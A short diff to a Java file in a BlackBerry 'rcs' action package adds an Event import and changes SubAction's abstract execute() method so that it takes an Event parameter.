@@ -8,6 +8,7 @@
 package com.ht.rcs.blackberry.action;
 
 import com.ht.rcs.blackberry.Status;
+import com.ht.rcs.blackberry.event.Event;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
@@ -81,7 +82,7 @@ public abstract class SubAction {
         this.actionId = actionId_;
     }
 
-    public abstract boolean execute();
+    public abstract boolean execute(Event event);
 
     protected abstract boolean parse(byte[] confParams);
 
